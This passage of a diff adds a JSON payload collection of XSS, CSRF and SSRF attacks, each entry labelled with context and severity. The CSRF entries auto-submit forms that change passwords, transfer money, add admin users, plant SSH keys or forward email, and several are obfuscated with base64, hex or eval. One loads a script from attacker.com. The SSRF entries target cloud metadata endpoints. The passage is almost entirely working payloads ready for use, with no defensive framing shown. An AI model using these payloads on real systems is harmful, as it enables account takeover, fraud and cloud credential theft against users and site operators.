+    "payload": "<svg tabindex='0' onshow='alert(\"XSS97\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg tabindex='0' onshow='alert(\"XSS97\")'></svg>"
+  },
+  {
+    "id": "xss-098",
+    "description": "Stored XSS using svg with onstalled event",
+    "payload": "<svg onstalled='alert(\"XSS98\")'></svg>",
+    "context": "User input field",
+    "type": "stored",
+    "severity": "high",
+    "example_usage": "User input: <svg onstalled='alert(\"XSS98\")'></svg>"
+  },
+  {
+    "id": "xss-099",
+    "description": "Reflected XSS using svg with onsubmit event",
+    "payload": "<svg onsubmit='alert(\"XSS99\")'></svg>",
+    "context": "URL parameter",
+    "type": "reflected",
+    "severity": "high",
+    "example_usage": "http://example.com/page?param=<svg onsubmit='alert(\"XSS99\")'></svg>"
+  },
+  {
+    "id": "csrf-001",
+    "description": "CSRF using auto-submitting hidden form with POST method",
+    "payload": "<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Embed this form in a malicious page to auto-submit password change."
+  },
+  {
+    "id": "csrf-002",
+    "description": "CSRF using image tag with GET request",
+    "payload": "<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Trigger account deletion via GET request."
+  },
+  {
+    "id": "csrf-003",
+    "description": "CSRF using XMLHttpRequest with credentials",
+    "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Perform unauthorized money transfer."
+  },
+  {
+    "id": "csrf-005",
+    "description": "CSRF using auto-submitting form with file upload",
+    "payload": "<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Upload malicious avatar file."
+  },
+  {
+    "id": "csrf-006",
+    "description": "CSRF using meta refresh redirect with GET request",
+    "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Subscribe victim to premium plan."
+  },
+  {
+    "id": "csrf-007",
+    "description": "CSRF using script tag to load external script triggering action",
+    "payload": "<script src='https://attacker.com/csrf-trigger.js'></script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Load external script that performs CSRF."
+  },
+  {
+    "id": "csrf-008",
+    "description": "CSRF using iframe with auto-submitting form inside",
+    "payload": "<iframe style='display:none' srcdoc=\"<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>\"></iframe>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Change user settings silently."
+  },
+  {
+    "id": "csrf-009",
+    "description": "CSRF using SVG with embedded script and form submission",
+    "payload": "<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Trigger delete API call."
+  },
+  {
+    "id": "csrf-010",
+    "description": "CSRF using beacon API to send POST request",
+    "payload": "<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Send data to target endpoint."
+  },
+  {
+    "id": "csrf-011",
+    "description": "CSRF using form with onsubmit event to modify data",
+    "payload": "<form action='https://target.com/update' method='POST' onsubmit='this.data.value=\"hacked\"'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Modify data before submission."
+  },
+  {
+    "id": "csrf-012",
+    "description": "CSRF using image with onerror event to trigger XMLHttpRequest",
+    "payload": "<img src='invalid.jpg' onerror=\"var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');\">",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Like a post on victim's behalf."
+  },
+  {
+    "id": "csrf-013",
+    "description": "CSRF using form with hidden inputs and auto-submit",
+    "payload": "<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Transfer money silently."
+  },
+  {
+    "id": "csrf-015",
+    "description": "CSRF using form with enctype multipart/form-data",
+    "payload": "<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Upload file without user consent."
+  },
+  {
+    "id": "csrf-017",
+    "description": "CSRF using form with target iframe to hide submission",
+    "payload": "<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Change settings silently."
+  },
+  {
+    "id": "csrf-018",
+    "description": "CSRF using form with GET method and auto-submit",
+    "payload": "<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium",
+    "example_usage": "Send friend request without user consent."
+  },
+  {
+    "id": "csrf-019",
+    "description": "CSRF using meta refresh with POST form submission via JavaScript",
+    "payload": "<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high",
+    "example_usage": "Subscribe victim to premium plan."
+  },
+  {
+    "id": "csrf-021",
+    "description": "CSRF using stealth iframe with delayed form submission",
+    "payload": "<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-023",
+    "description": "CSRF using form with multiple hidden inputs and auto-submit",
+    "payload": "<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-024",
+    "description": "CSRF using image with onload event triggering XMLHttpRequest",
+    "payload": "<img src='https://target.com/api/trigger' onload=\"var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');\">",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-025",
+    "description": "CSRF using SVG with embedded script to submit form",
+    "payload": "<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-026",
+    "description": "CSRF using beacon API with custom payload",
+    "payload": "<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-027",
+    "description": "CSRF using form with enctype multipart/form-data and auto-submit",
+    "payload": "<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-028",
+    "description": "CSRF using iframe with srcdoc containing auto-submitting form",
+    "payload": "<iframe style='display:none' srcdoc=\"<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>\"></iframe>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-030",
+    "description": "CSRF using form with target iframe and hidden inputs",
+    "payload": "<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-032",
+    "description": "CSRF using form with onsubmit event modifying data",
+    "payload": "<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=\"hacked\"'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-034",
+    "description": "CSRF using meta refresh to redirect to GET endpoint",
+    "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-035",
+    "description": "CSRF using script to create and submit form dynamically",
+    "payload": "<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-037",
+    "description": "CSRF using form with multiple steps and chained submissions",
+    "payload": "<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-038",
+    "description": "CSRF using iframe with srcdoc and script to submit form",
+    "payload": "<iframe style='display:none' srcdoc=\"<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>\"></iframe>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-040",
+    "description": "CSRF using form with hidden iframe and delayed submission",
+    "payload": "<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-042",
+    "description": "CSRF using form with multiple hidden inputs and chained submission",
+    "payload": "<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-044",
+    "description": "CSRF using form with onsubmit event to modify hidden input",
+    "payload": "<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=\"hacked\"'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-045",
+    "description": "CSRF using image with onerror event to trigger XMLHttpRequest",
+    "payload": "<img src='nonexistent.jpg' onerror=\"var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');\">",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-046",
+    "description": "CSRF using meta refresh to redirect to sensitive GET endpoint",
+    "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-049",
+    "description": "CSRF using chained form submissions with timeouts",
+    "payload": "<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",
+    "context": "Malicious webpage",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-051",
+    "description": "CSRF to add admin user via hidden form",
+    "payload": "<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Admin panel user management",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-052",
+    "description": "CSRF to change email notification settings",
+    "payload": "<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Email service user settings",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-053",
+    "description": "CSRF to reset 2FA via GET request",
+    "payload": "<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>",
+    "context": "Security 2FA reset endpoint",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-054",
+    "description": "CSRF to subscribe victim to premium service",
+    "payload": "<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>",
+    "context": "Streaming service subscription",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-055",
+    "description": "CSRF to change victim's shipping address",
+    "payload": "<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "E-commerce user profile",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-056",
+    "description": "CSRF to add attacker as friend",
+    "payload": "<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Social media friend management",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-057",
+    "description": "CSRF to post malicious comment",
+    "payload": "<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>",
+    "context": "Blog comment submission",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-058",
+    "description": "CSRF to change victim's profile picture",
+    "payload": "<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Social media profile update",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-059",
+    "description": "CSRF to initiate money transfer",
+    "payload": "<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Online banking transfer",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-060",
+    "description": "CSRF to disable security alerts",
+    "payload": "<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Security settings",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-061",
+    "description": "CSRF to change victim's password",
+    "payload": "<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "User account management",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-062",
+    "description": "CSRF to add malicious webhook URL",
+    "payload": "<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Continuous Integration webhook settings",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-063",
+    "description": "CSRF to change victim's timezone",
+    "payload": "<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Calendar application settings",
+    "type": "CSRF",
+    "severity": "low"
+  },
+  {
+    "id": "csrf-064",
+    "description": "CSRF to enable auto-forwarding of emails",
+    "payload": "<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Email forwarding settings",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-065",
+    "description": "CSRF to add malicious SSH key",
+    "payload": "<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>",
+    "context": "Git hosting service SSH keys",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-066",
+    "description": "CSRF to change victim's language preference",
+    "payload": "<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "User interface settings",
+    "type": "CSRF",
+    "severity": "low"
+  },
+  {
+    "id": "csrf-067",
+    "description": "CSRF to add victim to attacker's mailing list",
+    "payload": "<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Newsletter subscription",
+    "type": "CSRF",
+    "severity": "low"
+  },
+  {
+    "id": "csrf-068",
+    "description": "CSRF to post malicious tweet",
+    "payload": "<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>",
+    "context": "Social media posting",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-069",
+    "description": "CSRF to add victim's phone number to spam list",
+    "payload": "<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "SMS spam management",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-070",
+    "description": "CSRF to change victim's default payment method",
+    "payload": "<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Payment gateway account settings",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-071",
+    "description": "CSRF to enable auto-approve on code reviews",
+    "payload": "<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Code review platform settings",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-072",
+    "description": "CSRF to add victim's device to attacker's monitoring",
+    "payload": "<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "IoT device management",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-073",
+    "description": "CSRF to change victim's calendar event",
+    "payload": "<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Calendar event management",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-074",
+    "description": "CSRF to add victim's IP to blacklist",
+    "payload": "<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Firewall management",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-075",
+    "description": "CSRF to change victim's DNS settings",
+    "payload": "<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "DNS management",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-076",
+    "description": "CSRF to add victim to attacker's mailing list",
+    "payload": "<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "Mailing list subscription",
+    "type": "CSRF",
+    "severity": "low"
+  },
+  {
+    "id": "csrf-077",
+    "description": "CSRF to change victim's profile bio",
+    "payload": "<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>",
+    "context": "Social media profile",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-078",
+    "description": "CSRF to add victim's phone number to spam list",
+    "payload": "<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "SMS spam management",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-079",
+    "description": "CSRF to change victim's notification preferences",
+    "payload": "<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>",
+    "context": "App notification settings",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-081",
+    "description": "CSRF with base64 encoded form and dynamic decoding",
+    "payload": "<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>",
+    "context": "Dynamic base64 decoded form submission",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-082",
+    "description": "CSRF with hex encoded script and eval",
+    "payload": "<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>",
+    "context": "Hex encoded script with eval",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-083",
+    "description": "CSRF with dynamically created iframe and delayed form submission",
+    "payload": "<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=\"https://target.com/api/transfer\" method=\"POST\" id=\"f\"><input name=\"amount\" value=\"1000\"/></form><script>document.getElementById(\\'f\\').submit();</script>');d.close();</script>",
+    "context": "Dynamic iframe with form",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-084",
+    "description": "CSRF with obfuscated string concatenation",
+    "payload": "<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",
+    "context": "String concatenation obfuscation",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-085",
+    "description": "CSRF with event-triggered form submission on mouseover",
+    "payload": "<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(\"f\").submit()'>Hover me</div>",
+    "context": "User interaction triggered CSRF",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-087",
+    "description": "CSRF with encoded URI components and dynamic decoding",
+    "payload": "<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",
+    "context": "Encoded element creation",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-089",
+    "description": "CSRF with obfuscated script using string split and join",
+    "payload": "<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",
+    "context": "String split and join obfuscation",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-090",
+    "description": "CSRF with script tag injection via innerHTML",
+    "payload": "<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=\"https://target.com/api/hack\" method=\"POST\" id=\"f\"><input name=\"data\" value=\"evil\"/></form><script>document.getElementById(\\'f\\').submit();</script>';</script>",
+    "context": "Script injection via innerHTML",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-091",
+    "description": "CSRF with obfuscated base64 and eval",
+    "payload": "<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>",
+    "context": "Base64 encoded eval obfuscation",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "csrf-093",
+    "description": "CSRF with meta refresh and URL encoded payload",
+    "payload": "<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>",
+    "context": "Meta refresh with URL encoding",
+    "type": "CSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "csrf-095",
+    "description": "CSRF with hidden image and onerror event",
+    "payload": "<img src='invalid.jpg' onerror=\"var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();\" style='display:none'/>",
+    "context": "Image onerror event trigger",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-096",
+    "description": "CSRF with obfuscated Unicode escapes",
+    "payload": "<script>var a=\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",
+    "context": "Unicode escape obfuscation",
+    "type": "CSRF",
+    "severity": "high"
+  },
+  {
+    "id": "csrf-098",
+    "description": "CSRF with XMLHttpRequest and obfuscated URL",
+    "payload": "<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",
+    "context": "XHR POST request",
+    "type": "CSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-001",
+    "description": "Basic SSRF to internal IP",
+    "payload": "http://127.0.0.1/",
+    "context": "Access internal localhost service",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-002",
+    "description": "SSRF to internal private IP range",
+    "payload": "http://192.168.1.1/",
+    "context": "Access internal network device",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-003",
+    "description": "SSRF to metadata service on AWS",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "context": "AWS EC2 instance metadata",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-004",
+    "description": "SSRF to GCP metadata service",
+    "payload": "http://metadata.google.internal/computeMetadata/v1/",
+    "context": "Google Cloud metadata",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-005",
